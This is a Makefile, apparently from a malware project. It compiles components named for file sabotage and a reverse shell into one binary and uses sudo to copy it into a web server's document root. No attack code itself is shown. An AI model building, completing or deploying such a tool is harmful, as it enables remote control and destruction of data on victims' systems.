FILENAME=out
SOURCE_DIR=./source
HEADER_DIR=./header
CONST_PATH=${HEADER_DIR}/const.h
WEB_PATH=/var/www/html

${FILENAME}: file-savotager.o reverse-sh.o init.o index.c
	gcc -o ${FILENAME} index.c file-savotager.o reverse-sh.o init.o
	sudo cp ./${FILENAME} ${WEB_PATH}

file-savotager.o: ${SOURCE_DIR}/file-savotager.c ${HEADER_DIR}/file-savotager.h ${CONST_PATH}
	gcc -c ${SOURCE_DIR}/file-savotager.c

reverse-sh.o: ${SOURCE_DIR}/reverse-sh.c ${HEADER_DIR}/reverse-sh.h ${CONST_PATH}
	gcc -c ${SOURCE_DIR}/reverse-sh.c

init.o: ${SOURCE_DIR}/init.c ${HEADER_DIR}/init.h ${CONST_PATH}
	gcc -c ${SOURCE_DIR}/init.c

clean:
	rm -f ./*.o ./${FILENAME} 